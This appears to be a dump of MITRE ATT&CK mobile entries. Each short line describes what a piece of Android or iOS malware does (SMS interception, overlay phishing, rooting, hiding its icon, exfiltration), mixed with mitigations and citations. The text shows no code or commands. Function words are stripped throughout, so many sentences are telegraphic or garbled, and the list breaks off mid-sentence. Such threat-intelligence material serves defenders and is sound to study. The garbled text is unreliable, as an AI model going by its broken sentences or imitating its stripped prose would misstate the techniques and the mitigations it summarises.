[Mandrake](https://attack.mitre.org/software/S0485) abuses accessibility service prevent removing administrator permissions, accessibility permissions, set default SMS handler.(Citation: Bitdefender Mandrake) Users encouraged careful applications grant phone call-based permissions to. Further, users change default handler applications recognize. [Tangelo](https://attack.mitre.org/software/S0329) functionality record calls victim device's environment.(Citation: Lookout-StealthMango) [Zen](https://attack.mitre.org/software/S0494) simulate user clicks ads prompts create Google accounts.(Citation: Google Security Zen) [Corona Updates](https://attack.mitre.org/software/S0425) collect pieces device information, including OS version, phone model, manufacturer.(Citation: TrendMicro Coronavirus Updates)  [Tiktok Pro](https://attack.mitre.org/software/S0558) list hidden files `/DCIM/.dat/` directory.(Citation: Zscaler TikTok Spyware) [Golden Cup](https://attack.mitre.org/software/S0535) collect received SMS messages.(Citation: Symantec GoldenCup) [Gustuff](https://attack.mitre.org/software/S0406) hides icon installation.(Citation: IB Gustuff Mar 2019)  [XLoader iOS](https://attack.mitre.org/software/S0490) installed malicious configuration profile.(Citation: TrendMicro-XLoader-FakeSpy) [SilkBean](https://attack.mitre.org/software/S0549) install applications C2 server.(Citation: Lookout Uyghur Campaign) [Cerberus](https://attack.mitre.org/software/S0480) list installed applications.(Citation: Threat Fabric Cerberus) Android 11 introduced privacy enhancements package visibility, filtering returned package manager. iOS 12 removed private API list installed applications non-app store applications.(Citation: Android Package Visibility) [HummingWhale](https://attack.mitre.org/software/S0321) generates revenue displaying fraudulent ads automatically installing apps. victims close ads, [HummingWhale](https://attack.mitre.org/software/S0321) runs virtual machine, creating fake perpetrators generate revenue.(Citation: ArsTechnica-HummingWhale) [Tiktok Pro](https://attack.mitre.org/software/S0558) persistent notification maintain access device sensors.(Citation: Zscaler TikTok Spyware) [Rotexy](https://attack.mitre.org/software/S0411) processes incoming SMS messages filtering based phone numbers, keywords, regular expressions, focusing banks, payment systems, mobile network operators. [Rotexy](https://attack.mitre.org/software/S0411) send list SMS messages device command control server.(Citation: securelist rotexy 2018) [TrickMo](https://attack.mitre.org/software/S0427) `MediaRecorder` class record screen targeted application user, abuse accessibility features record targeted applications intercept transaction authorization (TANs) scrape on-screen text.(Citation: SecurityIntelligence TrickMo) [Exobot](https://attack.mitre.org/software/S0522) intercept SMS messages.(Citation: Threat Fabric Exobot) [WireLurker](https://attack.mitre.org/software/S0312) obfuscates payload complex code structure, multiple component versions, file hiding, code obfuscation customized encryption thwart anti-reversing.(Citation: PaloAlto-WireLurker) Mobile security products action jailbroken devices detected, limiting adversary’s access password stores.  [Corona Updates](https://attack.mitre.org/software/S0425) exfiltrated data FTP.(Citation: TrendMicro Coronavirus Updates) [AndroRAT](https://attack.mitre.org/software/S0292) gathers audio microphone.(Citation: Lookout-EnterpriseApps) [FrozenCell](https://attack.mitre.org/software/S0577) read SMS messages exfiltration.(Citation: Lookout FrozenCell) [BusyGasper](https://attack.mitre.org/software/S0655) collect device’s location based cellular network GPS coordinates.(Citation: SecureList BusyGasper) [CarbonSteal](https://attack.mitre.org/software/S0529) remotely capture device audio.(Citation: Lookout Uyghur Campaign) [FakeSpy](https://attack.mitre.org/software/S0509) send SMS messages.(Citation: Cybereason FakeSpy) [Windshift](https://attack.mitre.org/groups/G0112) installed malicious MDM profiles iOS devices Operation ROCK.(Citation: BlackBerry Bahamut) [HenBox](https://attack.mitre.org/software/S0544) access device’s camera.(Citation: Palo Alto HenBox)  [FinFisher](https://attack.mitre.org/software/S0182) tracks latitude longitude coordinates infected device.(Citation: Lookout Dark Caracal Jan 2018) [Windshift](https://attack.mitre.org/groups/G0112) included location tracking capabilities malicious apps deployed Operation BULL Operation ROCK.(Citation: BlackBerry Bahamut) [TERRACOTTA](https://attack.mitre.org/software/S0545) Firebase C2 communication.(Citation: WhiteOps TERRACOTTA) [Triada](https://attack.mitre.org/software/S0424) encrypts data prior exfiltration.(Citation: Google Triada June 2019)  [Riltok](https://attack.mitre.org/software/S0403) intercept incoming SMS messages.(Citation: Kaspersky Riltok June 2019) [ViperRAT](https://attack.mitre.org/software/S0506) collect network configuration data device, including phone number, SIM operator, network operator.(Citation: Lookout ViperRAT) [OBAD](https://attack.mitre.org/software/S0286) encrypted code obfuscated decryption routine difficult analyze.(Citation: TrendMicro-Obad) [DualToy](https://attack.mitre.org/software/S0315) loads malicious risky apps Android iOS devices USB connection.(Citation: PaloAlto-DualToy) [Pegasus iOS](https://attack.mitre.org/software/S0289) ability record audio.(Citation: Lookout-Pegasus) [Bread](https://attack.mitre.org/software/S0432) perform SMS fraud versions malware, toll fraud versions.(Citation: Google Bread) [Tiktok Pro](https://attack.mitre.org/software/S0558) collect device photos credentials applications.(Citation: Zscaler TikTok Spyware) [AndroidOS/MalLocker.B](https://attack.mitre.org/software/S0524) prevent user interacting UI carefully crafted "call" notification screen. coupled overriding `onUserLeaveHint()` callback method spawn notification instance current dismissed. (Citation: MalLockerB) Linux kernel distributed [Allwinner](https://attack.mitre.org/software/S0319) reportedly contained simple backdoor root access. believed left kernel mistake authors.(Citation: HackerNews-Allwinner) Users advised extra scrutinous applications request location sensitive phone permissions, deny permissions requests applications recognize. Users scrutinize device administration permission request. request expected user recognize application, application uninstalled immediately. [INSOMNIA](https://attack.mitre.org/software/S0463) collect application database files, including Gmail, Hangouts, device photos, container directories third-party apps.(Citation: Google Project Insomnia) [GoldenEagle](https://attack.mitre.org/software/S0551) checked root.(Citation: Lookout Uyghur Campaign) [Red Alert 2.0](https://attack.mitre.org/software/S0539) communicated C2 HTTP.(Citation: Sophos Red Alert 2.0) [Mandrake](https://attack.mitre.org/software/S0485) collect device’s location.(Citation: Bitdefender Mandrake) [CarbonSteal](https://attack.mitre.org/software/S0529) searched device storage files, including .amr files (audio recordings) superuser binaries.(Citation: Lookout Uyghur Campaign) [Mandrake](https://attack.mitre.org/software/S0485) list installed applications.(Citation: Bitdefender Mandrake) [Red Alert 2.0](https://attack.mitre.org/software/S0539) stored data embedded strings.xml resource file.(Citation: Sophos Red Alert 2.0) [Mandrake](https://attack.mitre.org/software/S0485) manipulate visual components trick user granting dangerous permissions, phishing overlays JavaScript injection capture credentials.(Citation: Bitdefender Mandrake) [RuMMS](https://attack.mitre.org/software/S0313) gathers device model operating version transmits command control server.(Citation: FireEye-RuMMS) [BusyGasper](https://attack.mitre.org/software/S0655) collect SMS messages.(Citation: SecureList BusyGasper) Users warned granting access accessibility features device administration services, carefully scrutinize applications request dangerous permissions. Users taught boot safe mode uninstall malicious applications interfering uninstallation process. [GPlayed](https://attack.mitre.org/software/S0536) collect device’s model, country, Android version.(Citation: Talos GPlayed) [Skygofree](https://attack.mitre.org/software/S0327) controlled binary SMS.(Citation: Kaspersky-Skygofree) [SpyNote RAT](https://attack.mitre.org/software/S0305) files device C2 server.(Citation: Zscaler-SpyNote) [ViceLeaker](https://attack.mitre.org/software/S0418) delete arbitrary files device.(Citation: SecureList - ViceLeaker 2019) Security updates frequently fixes vulnerabilities leveraged modify protected operating files.  [FrozenCell](https://attack.mitre.org/software/S0577) retrieved account applications.(Citation: Lookout FrozenCell) [Mandrake](https://attack.mitre.org/software/S0485) enable app installation unknown sources.(Citation: Bitdefender Mandrake) [GoldenEagle](https://attack.mitre.org/software/S0551) collected SMS messages.(Citation: Lookout Uyghur Campaign) [SpyDealer](https://attack.mitre.org/software/S0324) exfiltrates data 40 apps WeChat, Facebook, WhatsApp, Skype, others.(Citation: PaloAlto-SpyDealer) [Desert Scorpion](https://attack.mitre.org/software/S0505) hide icon.(Citation: Lookout Desert Scorpion)  [FlexiSpy](https://attack.mitre.org/software/S0408) record video.(Citation: CyberMerchants-FlexiSpy) [SpyDealer](https://attack.mitre.org/software/S0324) harvests location data victims.(Citation: PaloAlto-SpyDealer) [Pegasus Android](https://attack.mitre.org/software/S0316) ability pictures device camera.(Citation: Lookout-PegasusAndroid) [Monokle](https://attack.mitre.org/software/S0407) queries device metadata make, model, power levels.(Citation: Lookout-Monokle) [CHEMISTGAMES](https://attack.mitre.org/software/S0555) download modules running.(Citation: CYBERWARCON CHEMISTGAMES) [FinFisher](https://attack.mitre.org/software/S0182) packaged ExynosAbuse, Android exploit gain root privileges.(Citation: Lookout Dark Caracal Jan 2018) [EventBot](https://attack.mitre.org/software/S0478) dynamically loads malicious functionality runtime RC4-encrypted TTF file. [EventBot](https://attack.mitre.org/software/S0478) utilizes ProGuard obfuscate generated APK file.(Citation: Cybereason EventBot) [Charger](https://attack.mitre.org/software/S0323) encodes strings binary arrays difficult inspect them. loads code encrypted resources dynamically includes meaningless commands mask actual commands passing through.(Citation: CheckPoint-Charger) Mobile security products detect rooted devices. [FlexiSpy](https://attack.mitre.org/software/S0408) root access establish reboot hooks re-install application `/data/misc/adn`.(Citation: FortiGuard-FlexiSpy) boot, [FlexiSpy](https://attack.mitre.org/software/S0408) spawns daemons process monitoring, monitoring, managing, system.(Citation: FortiGuard-FlexiSpy) [SpyNote RAT](https://attack.mitre.org/software/S0305) activate victim's microphone.(Citation: Zscaler-SpyNote) [Tangelo](https://attack.mitre.org/software/S0329) accesses browser history, pictures, videos.(Citation: Lookout-StealthMango) Device attestation detect devices unauthorized unsafe modifications.  Users advised public charging stations computers charge devices. Instead, users issued charger acquired trustworthy source. Users advised device prompts trust attached computers absolutely necessary.  [SilkBean](https://attack.mitre.org/software/S0549) HTTPS C2 communication.(Citation: Lookout Uyghur Campaign)  [BusyGasper](https://attack.mitre.org/software/S0655) utilize device’s sensors determine device subsequently hide malicious activity. active, attempts hide malicious activity screen’s brightness muting device.(Citation: SecureList BusyGasper) [FrozenCell](https://attack.mitre.org/software/S0577) gathered device manufacturer, model, serial number.(Citation: Lookout FrozenCell) [FakeSpy](https://attack.mitre.org/software/S0509) collect SMS messages.(Citation: Cybereason FakeSpy) [Exobot](https://attack.mitre.org/software/S0522) device’s IMEI, phone number, IP address.(Citation: Threat Fabric Exobot)  [Skygofree](https://attack.mitre.org/software/S0327) capability files installed applications.(Citation: Kaspersky-Skygofree) [Triada](https://attack.mitre.org/software/S0424) injects code Zygote process effectively include forked processes. Additionally, code injected Android Play Store App, browser applications, UI application.(Citation: Google Triada June 2019)(Citation: Kaspersky Triada March 2016)  [Bread](https://attack.mitre.org/software/S0432) native code attempt disguise malicious functionality.(Citation: Google Bread) [TrickMo](https://attack.mitre.org/software/S0427) delete SMS messages.(Citation: SecurityIntelligence TrickMo) [Tiktok Pro](https://attack.mitre.org/software/S0558) collect device’s logs.(Citation: Zscaler TikTok Spyware) [Mandrake](https://attack.mitre.org/software/S0485) hide icon Android versions.(Citation: Bitdefender Mandrake)  [FlexiSpy](https://attack.mitre.org/software/S0408) retrieve list installed applications.(Citation: FlexiSpy-Features)  Security updates frequently patches vulnerabilities exploited root access. [ViceLeaker](https://attack.mitre.org/software/S0418) photos cameras.(Citation: SecureList - ViceLeaker 2019) [Monokle](https://attack.mitre.org/software/S0407) track device's location.(Citation: Lookout-Monokle) [Twitoor](https://attack.mitre.org/software/S0302) encrypts C2 communication.(Citation: ESET-Twitoor) [DroidJack](https://attack.mitre.org/software/S0320) captures data.(Citation: Zscaler-SuperMarioRun) [Desert Scorpion](https://attack.mitre.org/software/S0505) send SMS messages.(Citation: Lookout Desert Scorpion) [INSOMNIA](https://attack.mitre.org/software/S0463) extract device’s keychain.(Citation: Google Project Insomnia)  [Android/Chuli.A](https://attack.mitre.org/software/S0304) SMS receive command control messages.(Citation: Kaspersky-WUC) [BusyGasper](https://attack.mitre.org/software/S0655) send SMS message device boots, messages logs, messages adversary-specified custom content, delete SMS messages device.(Citation: SecureList BusyGasper) [ViperRAT](https://attack.mitre.org/software/S0506) collect device photos, PDF documents, Office documents, browser history, browser bookmarks.(Citation: Lookout ViperRAT) [DEFENSOR ID](https://attack.mitre.org/software/S0479) abuses accessibility service auto-start malware device boot. accomplished receiving `android.accessibilityservice.AccessibilityService` intent.(Citation: ESET DEFENSOR ID) Application developers cautious selecting third-party libraries integrate application.  [RedDrop](https://attack.mitre.org/software/S0326) collects exfiltrates including IMEI, IMSI, MNC, MCC, nearby Wi-Fi networks, device SIM-related info.(Citation: Wandera-RedDrop) [FakeSpy](https://attack.mitre.org/software/S0509) collect device’s network information.(Citation: Cybereason FakeSpy) [DoubleAgent](https://attack.mitre.org/software/S0550) AES encrypted file assets folder unsuspecting (e.g. ‘GoogleMusic.png’) holding configuration C2 information.(Citation: Lookout Uyghur Campaign) [Rotexy](https://attack.mitre.org/software/S0411) collects device's IMEI sends command control server.(Citation: securelist rotexy 2018) [Exobot](https://attack.mitre.org/software/S0522) injects capture users’ credentials.(Citation: Threat Fabric Exobot) [Golden Cup](https://attack.mitre.org/software/S0535) encrypted exfiltrated data AES ECB mode.(Citation: Symantec GoldenCup) [Gustuff](https://attack.mitre.org/software/S0406) injects global action `GLOBAL_ACTION_BACK` mimic pressing button close application antivirus application detected.(Citation: Talos Gustuff Apr 2019)  [Exobot](https://attack.mitre.org/software/S0522) lock device password permanently disable screen.(Citation: Threat Fabric Exobot) [Anubis](https://attack.mitre.org/software/S0422) download attacker-specified APK files.(Citation: Trend Micro Anubis) [SimBad](https://attack.mitre.org/software/S0419) hides icon application launcher.(Citation: CheckPoint SimBad 2019) [Windshift](https://attack.mitre.org/groups/G0112) encrypted application strings AES ECB mode Blowfish, stored strings encoded hex Operation BULL. Further, Operation BULL, encryption stored application’s launcher icon file.(Citation: BlackBerry Bahamut) OS security updates typically exploit patches disclosed. [Dvmap](https://attack.mitre.org/software/S0420) attempts gain root access local exploits.(Citation: SecureList DVMap June 2017) [Mandrake](https://attack.mitre.org/software/S0485) download (Loader) (Core) stages dropper installed.(Citation: Bitdefender Mandrake) [GolfSpy](https://attack.mitre.org/software/S0421) device’s battery level, network operator, connection information, sensor information, device’s storage memory.(Citation: Trend Micro Bouncing Golf 2019)  [SpyDealer](https://attack.mitre.org/software/S0324) harvests contact lists victims.(Citation: PaloAlto-SpyDealer) [GolfSpy](https://attack.mitre.org/software/S0421) list running processes.(Citation: Trend Micro Bouncing Golf 2019) Users taught danger granting unnecessary permissions application advised extra scrutiny application requests them.  [GoldenEagle](https://attack.mitre.org/software/S0551) collected list installed application names.(Citation: Lookout Uyghur Campaign) [HenBox](https://attack.mitre.org/software/S0544) track device’s location.(Citation: Palo Alto HenBox) [WolfRAT](https://attack.mitre.org/software/S0489) update running malware.(Citation: Talos-WolfRAT)  [Zen](https://attack.mitre.org/software/S0494) simulate user clicks ads.(Citation: Google Security Zen) [ViperRAT](https://attack.mitre.org/software/S0506) collect device’s log.(Citation: Lookout ViperRAT) locked bootloader prevent unauthorized modifications protected operating files.  [Pallas](https://attack.mitre.org/software/S0399) captures audio device microphone.(Citation: Lookout Dark Caracal Jan 2018)  [GolfSpy](https://attack.mitre.org/software/S0421) record audio phone calls.(Citation: Trend Micro Bouncing Golf 2019) [RCSAndroid](https://attack.mitre.org/software/S0295) capture photos cameras.(Citation: TrendMicro-RCSAndroid)  [Exodus](https://attack.mitre.org/software/S0405) collects list nearby base stations.(Citation: SWB Exodus March 2019)  [Android/Chuli.A](https://attack.mitre.org/software/S0304) stole contact list data stored phone SIM card.(Citation: Kaspersky-WUC) [Anubis](https://attack.mitre.org/software/S0422) keylogger application installed device.(Citation: Cofense Anubis)  [Rotexy](https://attack.mitre.org/software/S0411) automatically reply SMS messages, optionally delete them.(Citation: securelist rotexy 2018) [SilkBean](https://attack.mitre.org/software/S0549) access device’s location.(Citation: Lookout Uyghur Campaign) [Monokle](https://attack.mitre.org/software/S0407) download attacker-specified files.(Citation: Lookout-Monokle)  [BusyGasper](https://attack.mitre.org/software/S0655) perform actions hardcoded magic SMS strings received.(Citation: SecureList BusyGasper) Developers Android App Links(Citation: Android App Links) iOS Universal Links(Citation: iOS Universal Links) provide secure binding URIs applications, preventing malicious applications intercepting redirections. Additionally, OAuth cases, PKCE(Citation: IETF-PKCE) prevent stolen authorization codes.  [Exodus](https://attack.mitre.org/software/S0405) extract GPS coordinates device.(Citation: SWB Exodus March 2019)  [Monokle](https://attack.mitre.org/software/S0407) retrieve calendar event including event name, place, description.(Citation: Lookout-Monokle)  [Exobot](https://attack.mitre.org/software/S0522) access device’s contact list.(Citation: Threat Fabric Exobot) partition integrity mechanisms, Verified Boot, detect unauthorized modification files. Device attestation detect unauthorized operating modifications.  [Triada](https://attack.mitre.org/software/S0424) utilized exfiltrate data POST requests command control server.(Citation: Google Triada June 2019)  [ViperRAT](https://attack.mitre.org/software/S0506) collect device’s cell tower information.(Citation: Lookout ViperRAT) [Tiktok Pro](https://attack.mitre.org/software/S0558) hide icon launch.(Citation: Zscaler TikTok Spyware) [DoubleAgent](https://attack.mitre.org/software/S0550) accessed browser history, files 15 apps.(Citation: Lookout Uyghur Campaign) [Monokle](https://attack.mitre.org/software/S0407) record audio device's microphone record phone calls, output audio quality.(Citation: Lookout-Monokle) [TERRACOTTA](https://attack.mitre.org/software/S0545) collected device’s phone check active network connection metered.(Citation: WhiteOps TERRACOTTA) [ZergHelper](https://attack.mitre.org/software/S0287) attempts extend capabilities dynamic updating code.(Citation: Xiao-ZergHelper) [Golden Cup](https://attack.mitre.org/software/S0535) list installed applications.(Citation: Symantec GoldenCup) [CarbonSteal](https://attack.mitre.org/software/S0529) collect notes data MiCode app.(Citation: Lookout Uyghur Campaign) [ViceLeaker](https://attack.mitre.org/software/S0418) requests C2 communication.(Citation: SecureList - ViceLeaker 2019)(Citation: Bitdefender - Triout 2018) [GPlayed](https://attack.mitre.org/software/S0536) collect user’s browser cookies.(Citation: Talos GPlayed) [Monokle](https://attack.mitre.org/software/S0407) retrieve history.(Citation: Lookout-Monokle)  Mobile security products detect jailbroken rooted devices. [FrozenCell](https://attack.mitre.org/software/S0577) compressed encrypted data exfiltration password protected .7z archives.(Citation: Lookout FrozenCell) [TrickMo](https://attack.mitre.org/software/S0427) steal pictures device.(Citation: SecurityIntelligence TrickMo)  [DoubleAgent](https://attack.mitre.org/software/S0550) searched specific existing data directories, including Gmail app, Dropbox app, Pictures, thumbnails.(Citation: Lookout Uyghur Campaign)  iOS 11 introduced first-come-first-served principle URIs, allowing prior installed app launched URI.(Citation: Trend Micro iOS URL Hijacking) Android 6 introduced App Links. [Exobot](https://attack.mitre.org/software/S0522) phishing popups targeted application running.(Citation: Threat Fabric Exobot)  [CarbonSteal](https://attack.mitre.org/software/S0529) incorrect file extensions encryption hide assets, including secondary APKs, configuration files, JAR DEX files.(Citation: Lookout Uyghur Campaign) [Pegasus Android](https://attack.mitre.org/software/S0316) attempts modify device's partition.(Citation: Lookout-PegasusAndroid) Access SMS messages uncommonly permission, users instructed extra scrutiny granting access SMS messages.  [FlexiSpy](https://attack.mitre.org/software/S0408) delete data compromised device.(Citation: CyberMerchants-FlexiSpy) vulnerabilities injecting code existing applications patched previous Android releases. [HummingBad](https://attack.mitre.org/software/S0322) exploit unfixed vulnerabilities Android versions root victim phones.(Citation: ArsTechnica-HummingBad) [Dvmap](https://attack.mitre.org/software/S0420) decrypts executables archive files stored `assets` directory installation binary.(Citation: SecureList DVMap June 2017) [ViperRAT](https://attack.mitre.org/software/S0506) collect record audio content.(Citation: Lookout ViperRAT) [SpyDealer](https://attack.mitre.org/software/S0324) commercial rooting app Baidu Easy Root gain root privilege maintain persistence victim.(Citation: PaloAlto-SpyDealer) [Asacub](https://attack.mitre.org/software/S0540) encrypted C2 communications Base64-encoded RC4.(Citation: Securelist Asacub) Calendar access uncommonly permission, users instructed extra scrutiny granting access device calendar.  [Exobot](https://attack.mitre.org/software/S0522) request device administrator permissions.(Citation: Threat Fabric Exobot) [Exobot](https://attack.mitre.org/software/S0522) device’s country carrier name.(Citation: Threat Fabric Exobot) [RCSAndroid](https://attack.mitre.org/software/S0295) record location.(Citation: TrendMicro-RCSAndroid) [FrozenCell](https://attack.mitre.org/software/S0577) recorded calls.(Citation: Lookout FrozenCell) [GolfSpy](https://attack.mitre.org/software/S0421) device’s log.(Citation: Trend Micro Bouncing Golf 2019) [Pegasus Android](https://attack.mitre.org/software/S0316) checks device Wi-Fi, cellular network, roaming.(Citation: Lookout-PegasusAndroid) [FinFisher](https://attack.mitre.org/software/S0182) captures exfiltrates SMS messages.(Citation: Lookout Dark Caracal Jan 2018) [Rotexy](https://attack.mitre.org/software/S0411) lock foreground, requiring user enter credit card matches intercepted SMS messages, 4 digits credit card number. attempts revoke administrator permissions detected, [Rotexy](https://attack.mitre.org/software/S0411) periodically switches phone screen inhibit permission removal.(Citation: securelist rotexy 2018) [Mandrake](https://attack.mitre.org/software/S0485) domain generation algorithms.(Citation: Bitdefender Mandrake) [CarbonSteal](https://attack.mitre.org/software/S0529) access device’s SMS MMS messages.(Citation: Lookout Uyghur Campaign) Inform users device rooting granting unnecessary access accessibility service security risks advantage knowledge. [FlexiSpy](https://attack.mitre.org/software/S0408) intercept SMS MMS messages monitor messages keywords.(Citation: CyberMerchants-FlexiSpy)(Citation: FlexiSpy-Features) [Tiktok Pro](https://attack.mitre.org/software/S0558) delete attacker-specified files.(Citation: Zscaler TikTok Spyware)   [EventBot](https://attack.mitre.org/software/S0478) abuse Android’s accessibility service record screen PIN.(Citation: Cybereason EventBot) (Citation: CYBERWARCON CHEMISTGAMES) [Skygofree](https://attack.mitre.org/software/S0327) capability exploit vulnerabilities escalate privileges.(Citation: Kaspersky-Skygofree) [Anubis](https://attack.mitre.org/software/S0422) retrieve C2 address Twitter Telegram.(Citation: Cofense Anubis)(Citation: Trend Micro Anubis)  [FlexiSpy](https://attack.mitre.org/software/S0408) track device's location.(Citation: CyberMerchants-FlexiSpy) [GoldenEagle](https://attack.mitre.org/software/S0551) screenshots.(Citation: Lookout Uyghur Campaign) [Dendroid](https://attack.mitre.org/software/S0301) record audio outgoing calls.(Citation: Lookout-Dendroid) [SpyNote RAT](https://attack.mitre.org/software/S0305) read SMS messages.(Citation: Zscaler-SpyNote) [TERRACOTTA](https://attack.mitre.org/software/S0545) download additional modules runtime JavaScript `eval` statements.(Citation: WhiteOps TERRACOTTA) [FlexiSpy](https://attack.mitre.org/software/S0408) installs boot hooks `/system/su.d`.(Citation: FortiGuard-FlexiSpy) [GoldenEagle](https://attack.mitre.org/software/S0551) extracted messages chat programs, WeChat.(Citation: Lookout Uyghur Campaign) [Agent Smith](https://attack.mitre.org/software/S0440) inject fraudulent modules existing applications device.(Citation: CheckPoint Agent Smith) [Charger](https://attack.mitre.org/software/S0323) steals contacts victim user's device.(Citation: CheckPoint-Charger) [CarbonSteal](https://attack.mitre.org/software/S0529) specially crafted SMS messages control target device.(Citation: Lookout Uyghur Campaign)  [GolfSpy](https://attack.mitre.org/software/S0421) screenshots.(Citation: Trend Micro Bouncing Golf 2019) [Dendroid](https://attack.mitre.org/software/S0301) photos record videos.(Citation: Lookout-Dendroid)  [Exodus](https://attack.mitre.org/software/S0405) exfiltrate log.(Citation: SWB Exodus March 2019)  [SpyDealer](https://attack.mitre.org/software/S0324) registers broadcast receiver listen events device boot-up.(Citation: PaloAlto-SpyDealer) [Twitoor](https://attack.mitre.org/software/S0302) controlled Twitter.(Citation: ESET-Twitoor) [GoldenEagle](https://attack.mitre.org/software/S0551) collected logs.(Citation: Lookout Uyghur Campaign) [GolfSpy](https://attack.mitre.org/software/S0421) encrypts data simple XOR operation pre-configured key prior exfiltration.(Citation: Trend Micro Bouncing Golf 2019) [Marcher](https://attack.mitre.org/software/S0317) attempts overlay legitimate banking apps effort capture user credentials. [Marcher](https://attack.mitre.org/software/S0317) attempts overlay legitimate apps Google Play Store effort capture user credit card information.(Citation: Proofpoint-Marcher) [Asacub](https://attack.mitre.org/software/S0540) collect SMS messages received.(Citation: Securelist Asacub) [WolfRAT](https://attack.mitre.org/software/S0489) receive notifications.(Citation: Talos-WolfRAT) [Anubis](https://attack.mitre.org/software/S0422) record phone calls audio.(Citation: Cofense Anubis) [Cerberus](https://attack.mitre.org/software/S0480) uninstall device command.(Citation: Threat Fabric Cerberus) [ViceLeaker](https://attack.mitre.org/software/S0418) arbitrary files device C2 server, exfiltrate browsing history, exfiltrate card structure, exfiltrate pictures user takes them.(Citation: SecureList - ViceLeaker 2019)(Citation: Bitdefender - Triout 2018) [Pegasus Android](https://attack.mitre.org/software/S0316) accesses contact list information.(Citation: Lookout-PegasusAndroid)  [Adups](https://attack.mitre.org/software/S0309) transmitted logs.(Citation: NYTimes-BackDoor) [HenBox](https://attack.mitre.org/software/S0544) access device’s contact list.(Citation: Palo Alto HenBox) [Riltok](https://attack.mitre.org/software/S0403) injects input set default SMS handler clicking screen. close minimize targeted antivirus applications device security settings screen.(Citation: Kaspersky Riltok June 2019) [HenBox](https://attack.mitre.org/software/S0544) load additional Dalvik code running.(Citation: Palo Alto HenBox) [Exodus](https://attack.mitre.org/software/S0405) extract pictures Gallery, Chrome SBrowser bookmarks, connected WiFi network's password.(Citation: SWB Exodus March 2019) [DoubleAgent](https://attack.mitre.org/software/S0550) accessed list installed apps.(Citation: Lookout Uyghur Campaign) [RedDrop](https://attack.mitre.org/software/S0326) exfiltrates details victim device operating manufacturer.(Citation: Wandera-RedDrop) [GPlayed](https://attack.mitre.org/software/S0536) request device’s location.(Citation: Talos GPlayed) [Red Alert 2.0](https://attack.mitre.org/software/S0539) collect device’s log.(Citation: Sophos Red Alert 2.0) [Ginp](https://attack.mitre.org/software/S0423) send SMS messages.(Citation: ThreatFabric Ginp) [XLoader Android](https://attack.mitre.org/software/S0318) requests Android Device Administrator access.(Citation: TrendMicro-XLoader)  Enterprise policies prevent enabling USB debugging Android devices device application development). EMM/MDM Android `DevicePolicyManager.setPermittedAccessibilityServices` method set explicit list applications allowed Android's accessibility features. [BusyGasper](https://attack.mitre.org/software/S0655) keylogger module screenshots screen user tapped.(Citation: SecureList BusyGasper) [Pallas](https://attack.mitre.org/software/S0399) pictures rear-facing cameras.(Citation: Lookout Dark Caracal Jan 2018) [Mandrake](https://attack.mitre.org/software/S0485) delete data infected device.(Citation: Bitdefender Mandrake) [Mandrake](https://attack.mitre.org/software/S0485) access device configuration status, including Android version, battery level, device model, country, SIM operator.(Citation: Bitdefender Mandrake) [TrickMo](https://attack.mitre.org/software/S0427) detect running rooted device emulator.(Citation: SecurityIntelligence TrickMo) [CHEMISTGAMES](https://attack.mitre.org/software/S0555) distributed updates legitimate applications. accomplished compromising legitimate app developers, subsequently gaining access Google Play Store developer account.(Citation: CYBERWARCON CHEMISTGAMES) [FlexiSpy](https://attack.mitre.org/software/S0408) collect device contacts.(Citation: CyberMerchants-FlexiSpy) [FakeSpy](https://attack.mitre.org/software/S0509) collect device’s contact list.(Citation: Cybereason FakeSpy) [Rotexy](https://attack.mitre.org/software/S0411) collects compromised device, including phone number, network operator, OS version, device model, device registration country.(Citation: securelist rotexy 2018) [Windshift](https://attack.mitre.org/groups/G0112) encrypted C2 communications AES CBC mode Operation BULL Operation ROCK.(Citation: BlackBerry Bahamut) [Triada](https://attack.mitre.org/software/S0424) redirect banner URLs websites visited user specific URLs.(Citation: Google Triada June 2019)(Citation: Kaspersky Triada June 2016)   [Rotexy](https://attack.mitre.org/software/S0411) encrypts JSON payloads AES.(Citation: securelist rotexy 2018)   EMM/MDM Android `DevicePolicyManager.setPermittedAccessibilityServices` method set explicit list applications allowed Android's accessibility features. [ShiftyBug](https://attack.mitre.org/software/S0294) packed publicly exploits perform rooting.(Citation: Lookout-Adware) [Mandrake](https://attack.mitre.org/software/S0485) install attacker-specified components applications.(Citation: Bitdefender Mandrake)  [eSurv](https://attack.mitre.org/software/S0507) exfiltrated data requests.(Citation: Lookout eSurv)  [Ginp](https://attack.mitre.org/software/S0423) download device logs.(Citation: ThreatFabric Ginp)  [GPlayed](https://attack.mitre.org/software/S0536) phishing WebView pretending Google service collects credit card information.(Citation: Talos GPlayed) [Cerberus](https://attack.mitre.org/software/S0480) record keystrokes.(Citation: Threat Fabric Cerberus) [ViceLeaker](https://attack.mitre.org/software/S0418) includes code hide icon, function called analyzed version software.(Citation: Bitdefender - Triout 2018) Mobile security products typically detect jailbroken rooted devices.  [GolfSpy](https://attack.mitre.org/software/S0421) delete arbitrary files device.(Citation: Trend Micro Bouncing Golf 2019) [Red Alert 2.0](https://attack.mitre.org/software/S0539) running application.(Citation: Sophos Red Alert 2.0) [Pallas](https://attack.mitre.org/software/S0399) captures exfiltrates SMS messages, including future messages received.(Citation: Lookout Dark Caracal Jan 2018) [SpyDealer](https://attack.mitre.org/software/S0324) harvests SMS MMS messages victims.(Citation: PaloAlto-SpyDealer) Android devices profile, `DevicePolicyManager.setPermittedCrossProfileNotificationListeners` method manage list applications running personal profile access notifications generated profile. policy affect notifications generated rest device. `DevicePolicyManager.setApplicationHidden` method disable notification access unwanted applications, method block entire application running.(Citation: Android Notification Listeners)  [XLoader iOS](https://attack.mitre.org/software/S0490) exfiltrated data requests.(Citation: TrendMicro-XLoader-FakeSpy) [Stealth Mango](https://attack.mitre.org/software/S0328) uploads installed packages.(Citation: Lookout-StealthMango) [Operation Dust Storm](https://attack.mitre.org/campaigns/C0016), threat actors Android backdoors continually SMS messages C2 servers.(Citation: Cylance Dust Storm) [Agent Smith](https://attack.mitre.org/software/S0440)’s core malware disguised JPG file, encrypted XOR cipher.(Citation: CheckPoint Agent Smith) [Pegasus Android](https://attack.mitre.org/software/S0316) accesses list installed applications.(Citation: Lookout-PegasusAndroid) [Pegasus Android](https://attack.mitre.org/software/S0316) SMS command control.(Citation: Lookout-PegasusAndroid)  [Skygofree](https://attack.mitre.org/software/S0327) controlled HTTP, XMPP, FirebaseCloudMessaging, GoogleCloudMessaging versions.(Citation: Kaspersky-Skygofree) [ViceLeaker](https://attack.mitre.org/software/S0418) record audio device’s microphone record phone calls caller ID.(Citation: SecureList - ViceLeaker 2019)(Citation: Bitdefender - Triout 2018) [Monokle](https://attack.mitre.org/software/S0407) list applications installed 